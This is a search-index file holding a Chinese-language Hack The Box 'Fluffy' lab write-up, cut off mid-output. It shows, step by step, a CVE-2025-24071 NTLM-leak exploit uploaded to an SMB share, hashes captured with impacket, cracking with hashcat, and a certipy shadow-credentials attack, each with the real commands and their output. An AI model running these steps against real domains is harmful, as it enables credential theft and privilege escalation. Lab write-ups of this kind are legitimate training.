<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>htb-season8.2-fluffy</title>
      <link href="/2025/07/28/htb-season8-2-fluffy/"/>
      <url>/2025/07/28/htb-season8-2-fluffy/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250726213415466.png" alt="image-20250726213415466"></p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# nmap -sCV -p- --min-rate 10000 10.10.11.69</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-26 08:56 EDT</span><br><span class="line">Nmap scan report for 10.10.11.69</span><br><span class="line">Host is up (0.65s latency).</span><br><span class="line">Not shown: 65516 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-26 19:33:46Z)</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:26+00:00; +6h36m16s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:25+00:00; +6h36m16s from scanner time.</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:26+00:00; +6h36m16s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=DC01.fluffy.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:DC01.fluffy.htb</span><br><span class="line">| Not valid before: 2025-04-17T16:04:17</span><br><span class="line">|_Not valid after:  2026-04-17T16:04:17</span><br><span class="line">|_ssl-date: 2025-07-26T19:35:25+00:00; +6h36m16s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49667/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49690/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49691/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49707/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49713/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49742/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-07-26T19:34:49</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 6h36m15s, deviation: 0s, median: 6h36m15s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 155.50 seconds</span><br><span class="line">                                                                                        </span><br></pre></td></tr></table></figure><p>探测一下smb共享</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/srv/ftp/incoming]</span><br><span class="line">└─# crackmapexec smb 10.10.11.69 -u &#x27;j.fleischman&#x27; -p &#x27;J0elTHEM4n1990!&#x27; --shares</span><br><span class="line">SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990! </span><br><span class="line">SMB         10.10.11.69     445    DC01             [+] Enumerated shares</span><br><span class="line">SMB         10.10.11.69     445    DC01             Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.69     445    DC01             -----           -----------     ------</span><br><span class="line">SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.69     445    DC01             C$                              Default share</span><br><span class="line">SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.69     445    DC01             IT              READ,WRITE      </span><br><span class="line">SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share </span><br><span class="line">SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share </span><br><span class="line">                                                                                             </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/htb/8/2fluffy]</span><br><span class="line">└─# smbclient //10.10.11.69/IT -U &quot;j.fleischman&quot;</span><br><span class="line"></span><br><span class="line">Password for [WORKGROUP\j.fleischman]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Mon May 19 10:27:02 2025</span><br><span class="line">  ..                                  D        0  Mon May 19 10:27:02 2025</span><br><span class="line">  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025</span><br><span class="line">  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025</span><br><span class="line">  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025</span><br><span class="line">  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025</span><br><span class="line">  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025</span><br><span class="line">cd </span><br><span class="line">                5842943 blocks of size 4096. 2047262 blocks available</span><br><span class="line">smb: \&gt; get Upgrade_Notice.pdf</span><br><span class="line">getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (39.4 KiloBytes/sec) (average 39.4 KiloBytes/sec)</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250727141208913.png" alt="image-20250727141208913"></p><p>他们在修补漏洞我们看一下都有什么可利用</p><h4 id="cve-2025-24071是通过-RAR-ZIP-提取和-library-ms-文件泄露-NTLM-哈希值"><a href="#cve-2025-24071是通过-RAR-ZIP-提取和-library-ms-文件泄露-NTLM-哈希值" class="headerlink" title="cve-2025-24071是通过 RAR&#x2F;ZIP 提取和 .library-ms 文件泄露 NTLM 哈希值"></a>cve-2025-24071是通过 RAR&#x2F;ZIP 提取和 .library-ms 文件泄露 NTLM 哈希值</h4><p>我们可以利用上传zip获得NTLM 哈希值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# python3 exploit.py -i 10.10.14.41 -f exploit</span><br><span class="line"></span><br><span class="line">          ______ ____    ____  _______       ___     ___    ___    _____        ___    _  _      ___    ______   __                                        </span><br><span class="line">         /      |\   \  /   / |   ____|     |__ \   / _ \  |__ \  | ____|      |__ \  | || |    / _ \  |____  | /_ |                                       </span><br><span class="line">        |  ,----&#x27; \   \/   /  |  |__    ______ ) | | | | |    ) | | |__    ______ ) | | || |_  | | | |     / /   | |                                       </span><br><span class="line">        |  |       \      /   |   __|  |______/ /  | | | |   / /  |___ \  |______/ /  |__   _| | | | |    / /    | |                                       </span><br><span class="line">        |  `----.   \    /    |  |____       / /_  | |_| |  / /_   ___) |       / /_     | |   | |_| |   / /     | |                                       </span><br><span class="line">         \______|    \__/     |_______|     |____|  \___/  |____| |____/       |____|    |_|    \___/   /_/      |_|                                       </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">                                                Windows File Explorer Spoofing Vulnerability (CVE-2025-24071)                                              </span><br><span class="line">                    by ThemeHackers                                                                                                                                                                                                                                                                                   </span><br><span class="line">                                                                                                                                                           </span><br><span class="line">Creating exploit with filename: exploit.library-ms</span><br><span class="line">Target IP: 10.10.14.41</span><br><span class="line"></span><br><span class="line">Generating library file...</span><br><span class="line">✓ Library file created successfully</span><br><span class="line"></span><br><span class="line">Creating ZIP archive...</span><br><span class="line">✓ ZIP file created successfully</span><br><span class="line"></span><br><span class="line">Cleaning up temporary files...</span><br><span class="line">✓ Cleanup completed</span><br><span class="line"></span><br><span class="line">Process completed successfully!</span><br><span class="line">Output file: exploit.zip</span><br><span class="line">Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# ls</span><br><span class="line">exploit.py  exploit.zip  LICENSE  README.md  requirements.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上传zip</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c &quot;put exploit.zip&quot;</span><br><span class="line">putting file exploit.zip as \exploit.zip (0.5 kb/s) (average 0.5 kb/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一下监听结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# impacket-smbserver share ./share -smb2support</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span><br><span class="line">[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Incoming connection (10.10.11.69,56480)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:a7120225a7fb4ee9ee78350d0efe3ae0:01010000000000008035c548d3fedb01ce761f9e03b5545100000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a00070008008035c548d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56480)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56481)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:80a8687700e04829ba984d1db8650078:010100000000000000cc5d49d3fedb0168aa22537e749fa300000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a000700080000cc5d49d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56481)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56482)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:fc9eb9eb14397ee2dcf26130cd255fa0:01010000000000008062f649d3fedb0185c03b96bcce126b00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a00070008008062f649d3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56482)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56483)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:1521ba3de8c9bcf81945b1ddd6deea59:010100000000000000f98e4ad3fedb01f76458b180d1935000000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a000700080000f98e4ad3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56483)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line">[*] Incoming connection (10.10.11.69,56484)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)</span><br><span class="line">[*] User DC01\p.agila authenticated successfully</span><br><span class="line">[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.11.69,56484)</span><br><span class="line">[*] Remaining connections []</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将得到的hash爆破一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# hashcat --identify hash</span><br><span class="line">The following hash-mode match the structure of your input hash:</span><br><span class="line"></span><br><span class="line">      # | Name                                                       | Category</span><br><span class="line">  ======+============================================================+======================================</span><br><span class="line">   5600 | NetNTLMv2                                                  | Network Protocol</span><br><span class="line"></span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# cat hash              </span><br><span class="line">p.agila::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class="line">============================================================================================================================================</span><br><span class="line">* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2212/4489 MB (1024 MB allocatable), 4MCU</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger set to 90c</span><br><span class="line"></span><br><span class="line">Host memory required for this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password/salt length (usually down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better for specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a855247dea1bfc42:0101000000000000808f274bd3fedb01e00f7352c66005fe00000000010010006500410055006f004e00480043007100030010006500410055006f004e004800430071000200100050004f0043005600720068004f004a000400100050004f0043005600720068004f004a0007000800808f274bd3fedb010600040002000000080030003000000000000000010000000020000054e6a940f446806547868bec8520a22e30044cd616e1285d3ed58bb14b4ac0e30a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00340031000000000000000000:prometheusx-303</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 5600 (NetNTLMv2)</span><br><span class="line">Hash.Target......: P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:4ec9d35651b43f15a8...000000</span><br><span class="line">Time.Started.....: Sun Jul 27 06:34:58 2025 (7 secs)</span><br><span class="line">Time.Estimated...: Sun Jul 27 06:35:05 2025 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:   789.9 kH/s (1.58ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4517888/14344385 (31.50%)</span><br><span class="line">Rejected.........: 0/4517888 (0.00%)</span><br><span class="line">Restore.Point....: 4515840/14344385 (31.48%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: proretriever -&gt; progree</span><br><span class="line">Hardware.Mon.#1..: Util: 68%</span><br><span class="line"></span><br><span class="line">Started: Sun Jul 27 06:34:56 2025</span><br><span class="line">Stopped: Sun Jul 27 06:35:06 2025</span><br><span class="line">                                                              </span><br></pre></td></tr></table></figure><p>得到了P.AGILA的密码为prometheusx-303</p><p>我们看一下P.AGILA的权限</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250727183703987.png" alt="image-20250727183703987"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250727183936663.png" alt="image-20250727183936663"></p><h4 id="影子证书攻击"><a href="#影子证书攻击" class="headerlink" title="影子证书攻击"></a>影子证书攻击</h4><p>他是一个service Account manager组。这个用户可以将自己加入Service Account用户组，然后对svc用户拥有GenericWrite权限，这个权限结合CA证书服务，可以导致影子证书攻击，也就是说，我们完全可以窃取他们的hash,进一步测试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# bloodyAD -d fluffy.htb -u p.agila -p &#x27;prometheusx-303&#x27; --dc-ip 10.10.11.69 add groupMember &#x27;SERVICE ACCOUNTS&#x27; p.agila</span><br><span class="line">[+] p.agila added to SERVICE ACCOUNTS</span><br><span class="line">                                                                                                                                                           </span><br><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad find -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69                                                     </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 33 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 11 enabled certificate templates</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA</span><br><span class="line">[!] Got error while trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via CSRA: Could not connect: timed out</span><br><span class="line">[*] Trying to get CA configuration for &#x27;fluffy-DC01-CA&#x27; via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration for &#x27;fluffy-DC01-CA&#x27;</span><br><span class="line">[*] Saved BloodHound data to &#x27;20250727134014_Certipy.zip&#x27;. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to &#x27;20250727134014_Certipy.txt&#x27;</span><br><span class="line">[*] Saved JSON output to &#x27;20250727134014_Certipy.json&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看一下我们对目标账户的属性修改权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# bloodyAD -d fluffy.htb -u p.agila -p &#x27;prometheusx-303&#x27; --dc-ip 10.10.11.69 get writable --detail                     </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=fluffy,DC=htb</span><br><span class="line">url: WRITE</span><br><span class="line">wWWHomePage: WRITE</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">shadowFlag: WRITE</span><br><span class="line">shadowExpire: WRITE</span><br><span class="line">shadowInactive: WRITE</span><br><span class="line">shadowWarning: WRITE</span><br><span class="line">shadowMax: WRITE</span><br><span class="line">shadowMin: WRITE</span><br><span class="line">shadowLastChange: WRITE</span><br><span class="line">loginShell: WRITE</span><br><span class="line">unixHomeDirectory: WRITE</span><br><span class="line">gecos: WRITE</span><br><span class="line">gidNumber: WRITE</span><br><span class="line">uidNumber: WRITE</span><br><span class="line">msSFU30NisDomain: WRITE</span><br><span class="line">msSFU30Name: WRITE</span><br><span class="line">labeledURI: WRITE</span><br><span class="line">userPKCS12: WRITE</span><br><span class="line">preferredLanguage: WRITE</span><br><span class="line">thumbnailLogo: WRITE</span><br><span class="line">thumbnailPhoto: WRITE</span><br><span class="line">````</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250727192330506.png" alt="image-20250727192330506"></p><p>攻击者可以<strong>将自己的公钥信息写入目标用户的 <code>msDS-KeyCredentialLink</code> 属性中</strong>。一旦写入成功，域控制器就会信任这个新的公钥。攻击者就可以使用与这个公钥对应的<strong>私钥</strong>来生成一个证书或 Kerberos 票据，然后冒充目标用户进行身份验证。</p><p>由于攻击者可以为域中的任何用户伪造一个有效的公钥凭据，如果目标用户是域管理员，攻击者就能以域管理员身份登录，实现权限升级。</p><p>执行影子证书攻击，窃取winrm_svc用户的hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/…/htb/8/2fluffy/CVE-2025-24071-main]</span><br><span class="line">└─# certipy-ad shadow auto -debug -u &#x27;p.agila@fluffy.htb&#x27; -p &#x27;prometheusx-303&#x27; -account &#x27;winrm_svc&#x27; -target dc01.fluffy.htb -dc-ip 10.10.11.69</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[+] Trying to resolve &#x27;dc01.fluffy.htb&#x27; at &#x27;10.10.11.69&#x27;</span><br><span class="line">[+] Authenticating to LDAP server</span><br><span class="line">[+] Bound to ldaps://10.10.11.69:636 - ssl</span><br><span class="line">[+] Default path: DC=fluffy,DC=htb</span><br><span class="line">[+] Configuration path: CN=Configuration,DC=fluffy,DC=htb</span><br><span class="line">[*] Targeting user &#x27;winrm_svc&#x27;</span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID &#x27;5d3553d2-81b4-8f70-e7ad-bc195c5a218d&#x27;</span><br><span class="line">&lt;KeyCredential structure at 0x7f0b38d54050&gt;</span><br><span class="line">  | Owner: CN=winrm service,CN=Users,DC=fluffy,DC=htb</span><br><span class="line">  | Version: 0x200</span><br><span class="line">  | KeyID: Oxq4/4W2f43XCTsLj1HiG8ca7dKNJGE7JqBXquQfqN4=</span><br><span class="line">  | KeyHash: 8a412cd101147142e8adc9245b594b8a059bd3a65c9df02765f9536432dad160</span><br><span class="line">  | RawKeyMaterial: &lt;dsinternals.common.cryptography.RSAKeyMaterial.RSAKeyMaterial object at 0x7f0b3907bd90&gt;</span><br><span class="line">  |  | Exponent (E): 65537</span><br><span class="line">  |  | Modulus (N): 0xcf126d263713ac29300f96235d6e90062a24b425deaf92ab717b9052859dc9e985ab98bacdedc98386c85a64eafa70a6f820cd2389c3fdf83f788f6ad30262c7e733f504f573c2f4c38694307b00581cf10dffc4150895ad9ebe63209c0d04443f2f3049579d8af853c29630eae2f5774d7014fc2e3b971143ce61b3b6202143bc0521bbb5a4431c67d22ff444d6ef98eed6be73c01456b076863d1a1de92edeb50bff4660fa3e5b8e0fc40b3fd19809648b010589e2733da0949de1c0a0c9723c7914b2e52ca6235452e226c1e98f69b47db6cd7e2da0e2f23d62cac8f4a0a1effc6833cdd34fb7f9ccfd481c87a03eedcec5d271e32b9de1674ac081e321c1</span><br><span class="line">  |  | Prime1 (P): 0x0</span><br><span class="line">  |  | Prime2 (Q): 0x0</span><br><span class="line">  | Usage: KeyUsage.NGC</span><br><span class="line">  | LegacyUsage: None</span><br><span class="line">  | Source: KeySource.AD</span><br><span class="line">  | DeviceId: 5d3553d2-81b4-8f70-e7ad-bc195c5a218d</span><br><span class="line">  | CustomKeyInfo: &lt;CustomKeyInformation at 0x7f0b38d03e80&gt;</span><br><span class="line">  |  | Version: 1</span><br><span class="line">  |  | Flags: 